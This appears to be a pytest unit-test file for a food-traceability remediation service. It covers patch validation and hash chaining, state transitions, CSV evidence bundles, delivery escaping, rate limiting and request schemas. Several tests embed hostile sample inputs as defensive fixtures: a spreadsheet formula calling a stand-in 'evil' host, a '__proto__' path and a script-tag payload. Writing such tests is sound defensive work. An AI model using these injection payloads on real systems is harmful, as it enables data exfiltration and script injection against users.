"""QA deep pass: remediation slice pure-unit coverage.

Covers correction patch validation and hash chaining, the case state
machine, deterministic manifest validation, evidence-bundle determinism
and CSV safety, delivery helpers, outbox enqueue routing, supplier rate
limiting, request schemas, and the integration-webhook mapping helpers.
Fast and deterministic: no DB, no network, no sleeps.
"""

from __future__ import annotations

import sys
from contextlib import contextmanager
from datetime import datetime, timedelta, timezone
from pathlib import Path
from types import SimpleNamespace

import pytest
from fastapi import HTTPException
from pydantic import ValidationError

service_dir = Path(__file__).parent.parent
sys.path.insert(0, str(service_dir))

from app.integration_webhook import FieldMapping, _apply_mapping, _extract_nested  # noqa: E402
from app.remediation import (
    corrections,  # noqa: E402
    delivery,  # noqa: E402
    evidence,  # noqa: E402
    outbox,  # noqa: E402
    state as rem_state,  # noqa: E402
    supplier_router as sup,  # noqa: E402
    validation as rem_val,  # noqa: E402
)
from app.remediation.schemas import (  # noqa: E402
    CorrectionRequest,
    CreateLinkRequest,
    ExchangeRequest,
)


class TestValidateFieldPath:
    def test_allowed_top_level_and_kde_paths(self):
        corrections.validate_field_path("quantity", ["quantity", "kdes.notes"])
        corrections.validate_field_path("kdes.notes", ["quantity", "kdes.notes"])

    def test_not_in_allowlist_rejected(self):
        with pytest.raises(HTTPException) as exc:
            corrections.validate_field_path("quantity", ["kdes.notes"])
        assert exc.value.status_code == 422

    def test_dunder_segment_rejected_even_when_listed(self):
        with pytest.raises(HTTPException) as exc:
            corrections.validate_field_path("__proto__", ["__proto__"])
        assert exc.value.status_code == 422

    def test_bare_kdes_prefix_rejected(self):
        with pytest.raises(HTTPException) as exc:
            corrections.validate_field_path("kdes.", ["kdes."])
        assert exc.value.status_code == 422

    def test_nested_path_rejected(self):
        with pytest.raises(HTTPException) as exc:
            corrections.validate_field_path("kdes.a.b", ["kdes.a.b"])
        assert exc.value.status_code == 422


class TestPatchValues:
    def test_set_and_get_kde_path(self):
        updated = corrections.set_value({"kdes": {}}, "kdes.ship_date", "2026-04-14")
        assert corrections.get_value(updated, "kdes.ship_date") == "2026-04-14"

    def test_set_does_not_mutate_original(self):
        original = {"quantity": 1}
        corrections.set_value(original, "quantity", 2)
        assert original == {"quantity": 1}

    def test_apply_patches_orders_by_seq(self):
        patches = [
            {"patch_seq": 2, "field_path": "quantity", "proposed_value": 20},
            {"patch_seq": 1, "field_path": "quantity", "proposed_value": 10},
        ]
        assert corrections.apply_patches({"quantity": 1}, patches)["quantity"] == 20


def _patch(seq, **overrides):
    base = {
        "tenant_id": "11111111-1111-4111-8111-111111111111",
        "case_id": "22222222-2222-4222-8222-222222222222",
        "manifest_record_id": "33333333-3333-4333-8333-333333333333",
        "patch_seq": seq,
        "validation_issue_id": None,
        "field_path": "quantity",
        "previous_value": 1,
        "proposed_value": 2,
        "correcting_org": "Valley Farms",
        "actor_name": "Sam Supplier",
        "actor_role": "QA",
        "auth_method": "remediation_token",
        "correction_reason": "Typo in quantity",
        "attestation_text": "I attest this is accurate.",
        "attested_at": datetime(2026, 4, 15, 12, 0, 0, tzinfo=timezone.utc),
    }
    base.update(overrides)
    return base


class TestPatchChain:
    def _chained(self, count=2):
        patches = []
        prev = None
        for seq in range(1, count + 1):
            body = corrections._hash_body(_patch(seq))
            digest = corrections.compute_patch_hash(prev, body)
            row = dict(_patch(seq))
            row["patch_hash"] = digest
            patches.append(row)
            prev = digest
        return patches

    def test_intact_chain_verifies(self):
        assert corrections.verify_patch_chain(self._chained(3)) is True

    def test_tampered_value_breaks_chain(self):
        patches = self._chained(2)
        patches[0]["proposed_value"] = 999
        assert corrections.verify_patch_chain(patches) is False

    def test_empty_chain_verifies(self):
        assert corrections.verify_patch_chain([]) is True

    def test_attested_at_round_trips_through_iso_string(self):
        row = _patch(1)
        body_from_obj = corrections._hash_body(row)
        row["attested_at"] = row["attested_at"].isoformat()
        assert corrections.compute_patch_hash(None, body_from_obj) == corrections.compute_patch_hash(
            None, corrections._hash_body(row)
        )


class _FakeResult:
    def __init__(self, rowcount=1):
        self.rowcount = rowcount

    def fetchone(self):
        return ("00000000-0000-4000-8000-000000000000",)


class _FakeDB:
    def __init__(self, rowcount=1):
        self.rowcount = rowcount
        self.executed = []

    def execute(self, *args, **kwargs):
        self.executed.append((args, kwargs))
        return _FakeResult(self.rowcount)

    @contextmanager
    def begin_nested(self):
        yield self


class TestStateTransition:
    def test_legal_transition_succeeds_without_mirror_query(self):
        db = _FakeDB(rowcount=1)
        rem_state.transition(
            db,
            tenant_id="11111111-1111-4111-8111-111111111111",
            case_id="22222222-2222-4222-8222-222222222222",
            to_status="supplier_action_required",
            expected_from="detected",
            actor="system",
        )
        assert len(db.executed) == 1

    def test_illegal_transition_is_409_before_any_write(self):
        db = _FakeDB(rowcount=1)
        with pytest.raises(HTTPException) as exc:
            rem_state.transition(
                db,
                tenant_id="11111111-1111-4111-8111-111111111111",
                case_id="22222222-2222-4222-8222-222222222222",
                to_status="released",
                expected_from="detected",
            )
        assert exc.value.status_code == 409
        assert "E_ILLEGAL_TRANSITION" in exc.value.detail
        assert db.executed == []

    def test_stale_transition_is_409(self):
        db = _FakeDB(rowcount=0)
        with pytest.raises(HTTPException) as exc:
            rem_state.transition(
                db,
                tenant_id="11111111-1111-4111-8111-111111111111",
                case_id="22222222-2222-4222-8222-222222222222",
                to_status="supplier_action_required",
                expected_from="detected",
            )
        assert exc.value.status_code == 409
        assert "E_STALE_TRANSITION" in exc.value.detail


class TestBuildEventFromRow:
    def test_invalid_quantity_kept_raw_and_blocked(self):
        event, _prov, failures = rem_val.build_event_from_row({"quantity": "abc", "traceability_lot_code": "ABC"})
        assert event["quantity"] == "abc"
        assert any(f["rule_id"] == "svc.invalid_quantity" for f in failures)

    def test_non_positive_quantity_blocked(self):
        _event, _prov, failures = rem_val.build_event_from_row({"quantity": "-5", "traceability_lot_code": "ABC"})
        assert any(f["rule_id"] == "svc.invalid_quantity" for f in failures)

    def test_short_tlc_blocked_with_intelligible_reason(self):
        _event, _prov, failures = rem_val.build_event_from_row({"quantity": "5", "traceability_lot_code": "AB"})
        assert any(f["rule_id"] == "svc.invalid_tlc" for f in failures)

    def test_unparseable_date_stays_raw_and_blocked(self):
        event, _prov, failures = rem_val.build_event_from_row(
            {"quantity": "5", "traceability_lot_code": "ABC", "timestamp": "not a date"}
        )
        assert event["timestamp"] == "not a date"
        assert any(f["rule_id"] == "svc.invalid_date" for f in failures)

    def test_us_date_normalized_deterministically(self):
        event, prov, failures = rem_val.build_event_from_row(
            {"quantity": "5", "traceability_lot_code": "ABC", "receive_date": "07/12/2026"}
        )
        assert failures == []
        assert event["kdes"]["receive_date"].startswith("2026-07-12")
        assert prov["kdes.receive_date"]["raw_value"] == "07/12/2026"

    def test_fingerprint_deterministic(self):
        row = {"quantity": "5", "traceability_lot_code": "ABC"}
        assert rem_val.row_fingerprint(row) == rem_val.row_fingerprint(dict(row))
        assert rem_val.row_fingerprint(row) != rem_val.row_fingerprint({**row, "quantity": "6"})

    def test_canonical_json_key_order_stable(self):
        assert rem_val.canonical_json({"b": 1, "a": 2}) == '{"a":2,"b":1}'


def _rule(result="fail", severity="critical", title="TLC present"):
    return SimpleNamespace(
        result=result,
        severity=severity,
        rule_id="rule.tlc",
        rule_version=1,
        rule_title=title,
        category="kde_presence",
        why_failed="missing",
        remediation_suggestion="Provide it.",
        evidence_fields_inspected=["traceability_lot_code"],
    )


def _summary(results):
    return SimpleNamespace(results=results)


class TestSnapshotFailures:
    def test_duplicate_issue_ids_deduplicated(self):
        failures, _warnings, blocking = rem_val.snapshot_failures(
            ["Missing required KDE 'x'", "Missing required KDE 'x'"], _summary([]), []
        )
        assert len(failures) == 1
        assert blocking is True

    def test_rule_error_treated_as_fail(self):
        failures, _warnings, blocking = rem_val.snapshot_failures([], _summary([_rule(result="error")]), [])
        assert len(failures) == 1
        assert failures[0]["result"] == "fail"
        assert blocking is True

    def test_warn_only_is_not_blocking(self):
        failures, warnings, blocking = rem_val.snapshot_failures([], _summary([_rule(result="warn")]), [])
        assert failures == []
        assert len(warnings) == 1
        assert blocking is False


class TestCorrectableFields:
    def _failure(self, field):
        return {
            "issue_id": "kde:x",
            "rule_id": "kde.completeness",
            "rule_version": 1,
            "rule_title": "Required KDE completeness",
            "severity": "critical",
            "category": "kde_presence",
            "result": "fail",
            "why_failed": "missing",
            "remediation": "Provide it.",
            "source": "kde",
            "field": field,
        }

    def test_top_level_field_correctable(self):
        out = rem_val.correctable_fields([self._failure("traceability_lot_code")])
        assert [f["field_path"] for f in out] == ["traceability_lot_code"]

    def test_row_level_finding_skipped(self):
        assert rem_val.correctable_fields([self._failure("some_bogus_field_xyz")]) == []
        assert rem_val.correctable_fields([self._failure(None)]) == []

    def test_rule_field_mapped_to_event_path(self):
        out = rem_val.correctable_fields([self._failure("product_reference")])
        assert [f["field_path"] for f in out] == ["product_description"]


class TestEvidence:
    def _record(self, **overrides):
        base = {
            "id": "33333333-3333-4333-8333-333333333333",
            "row_number": 1,
            "row_fingerprint": "fp",
            "validation_status": "passed",
            "release_status": "released",
            "released_event_id": "44444444-4444-4444-8444-444444444444",
            "normalized_payload": {"b": 1, "a": 2},
            "ruleset_hash": "rs",
        }
        base.update(overrides)
        return base

    def test_accepted_csv_neutralizes_formula_cells(self):
        record = self._record()
        record["normalized_payload"] = {
            "cte_type": "receiving",
            "traceability_lot_code": "ABC",
            "product_description": "=WEBSERVICE(\"http://evil\")",
            "quantity": 1,
            "unit_of_measure": "cases",
            "timestamp": "2026-04-14",
            "location_name": "DC",
            "kdes": {},
        }
        csv_text = evidence._accepted_csv([record])
        assert "'=WEBSERVICE" in csv_text
        assert "\n\"=WEBSERVICE" not in csv_text

    def test_bundle_content_hash_stable_across_rebuilds(self, monkeypatch):
        import io
        import zipfile

        # build_bundle calls the load_patches reference bound in the
        # evidence module namespace, so patch it there.
        monkeypatch.setattr(evidence, "load_patches", lambda db, **_kw: [])
        meta = {"raw_bytes": b"a,b\n1,2\n", "filename": "m.csv", "sha256": "abc"}
        records = [self._record()]
        first = evidence.build_bundle(None, tenant_id="t", run_meta=meta, records=records, run_id="r")
        second = evidence.build_bundle(None, tenant_id="t", run_meta=meta, records=records, run_id="r")

        def _manifest(bundle):
            with zipfile.ZipFile(io.BytesIO(bundle)) as zf:
                import json

                return json.loads(zf.read("manifest.json"))

        assert _manifest(first)["bundle_content_hash"] == _manifest(second)["bundle_content_hash"]


class TestDelivery:
    def test_correction_url_uses_fragment_not_query(self):
        url = delivery.correction_url("tok123")
        assert url == f"{delivery.CORRECTION_URL_BASE}#tok123"
        assert "?" not in url

    def test_render_html_escapes_body_and_link(self):
        html = delivery._render_html("<script>alert(1)</script>", "https://x.test/#a'b")
        assert "<script>" not in html
        assert "&lt;script&gt;" in html
        assert "a&#x27;b" in html

    def _token(self, **overrides):
        base = {
            "id": "t1",
            "case_id": "c1",
            "expires_at": datetime.now(timezone.utc) + timedelta(hours=2),
            "revoked_at": None,
            "superseded_by": None,
            "exchange_count": 0,
        }
        base.update(overrides)
        return base

    def test_skip_matrix(self):
        assert delivery.NotificationOutboxDrainer._token_skip_reason(None) == "token_missing"
        assert (
            delivery.NotificationOutboxDrainer._token_skip_reason(
                self._token(superseded_by="new", revoked_at=datetime.now(timezone.utc))
            )
            == "token_superseded"
        )
        assert (
            delivery.NotificationOutboxDrainer._token_skip_reason(
                self._token(revoked_at=datetime.now(timezone.utc))
            )
            == "token_revoked"
        )
        assert (
            delivery.NotificationOutboxDrainer._token_skip_reason(
                self._token(expires_at=datetime.now(timezone.utc) - timedelta(minutes=1))
            )
            == "token_expired"
        )
        assert delivery.NotificationOutboxDrainer._token_skip_reason(self._token(exchange_count=1)) == (
            "token_already_exchanged"
        )
        assert delivery.NotificationOutboxDrainer._token_skip_reason(self._token()) is None


class TestOutboxEnqueue:
    def test_recipient_queued_without_recipient_pending(self):
        seen = []

        class _DB(_FakeDB):
            def execute(self, *args, **kwargs):
                seen.append(kwargs.get("param") or (args[1] if len(args) > 1 else {}))
                return _FakeResult()

        db = _DB()
        outbox.enqueue_preview(
            db, tenant_id="t", case_id=None, recipient="s@test.test", subject="s", body="b", payload={}
        )
        outbox.enqueue_preview(db, tenant_id="t", case_id=None, recipient=None, subject="s", body="b", payload={})
        assert seen[0]["status"] == "queued"
        assert seen[1]["status"] == "pending"


class TestSupplierRateLimit:
    def _request(self, xff=None, host="9.9.9.9"):
        headers = {}
        if xff is not None:
            headers["x-forwarded-for"] = xff
        return SimpleNamespace(headers=headers, client=SimpleNamespace(host=host))

    def test_first_forwarded_hop_used_as_bucket(self, monkeypatch):
        seen = {}

        def _fake(**kwargs):
            seen.update(kwargs)
            return (True, 9)

        monkeypatch.setattr(sup, "_consume_rate_limit", _fake)
        sup._rate_limit(self._request(xff="1.2.3.4, 5.6.7.8", host=None), "preview", 10)
        assert seen["tenant_id"] == "remsup:1.2.3.4"

    def test_client_host_fallback(self, monkeypatch):
        seen = {}
        monkeypatch.setattr(sup, "_consume_rate_limit", lambda **kw: seen.update(kw) or (True, 9))
        sup._rate_limit(self._request(), "preview", 10)
        assert seen["tenant_id"] == "remsup:9.9.9.9"

    def test_denied_is_429(self, monkeypatch):
        monkeypatch.setattr(sup, "_consume_rate_limit", lambda **_kw: (False, 0))
        with pytest.raises(HTTPException) as exc:
            sup._rate_limit(self._request(), "exchange", 5)
        assert exc.value.status_code == 429


class TestSchemas:
    def _correction(self, **overrides):
        base = {
            "changes": {"quantity": "5"},
            "actor_name": "Sam",
            "actor_role": "QA",
            "reason": "fix typo",
            "attestation": {"text": "I attest this is accurate.", "accepted": True},
        }
        base.update(overrides)
        return CorrectionRequest(**base)

    def test_valid_correction(self):
        assert self._correction().changes == {"quantity": "5"}

    def test_empty_changes_rejected(self):
        with pytest.raises(ValidationError):
            self._correction(changes={})

    def test_too_many_changes_rejected(self):
        with pytest.raises(ValidationError):
            self._correction(changes={f"kdes.f{i}": "v" for i in range(11)})

    def test_exchange_token_length_bounds(self):
        with pytest.raises(ValidationError):
            ExchangeRequest(token="short")
        ExchangeRequest(token="x" * 16)

    def test_link_expiry_bounds(self):
        with pytest.raises(ValidationError):
            CreateLinkRequest(expires_hours=0)
        with pytest.raises(ValidationError):
            CreateLinkRequest(expires_hours=169)
        assert CreateLinkRequest().expires_hours == 24


class TestIntegrationMappingHelpers:
    def test_nested_mapping_extracts_dotted_source_path(self):
        # The full helper matrix lives in test_integration_webhook_1342.py;
        # this pins the one path the supplier flow depends on: a tenant
        # mapping can pull a canonical field out of a nested ERP envelope.
        mapping = FieldMapping(cte_type="header.docType")
        event = {"header": {"docType": "shipping"}, "traceability_lot_code": "T"}
        canonical = _apply_mapping(event, mapping)
        assert canonical["cte_type"] == "shipping"
        assert _extract_nested({"a": 5}, "a.b") is None
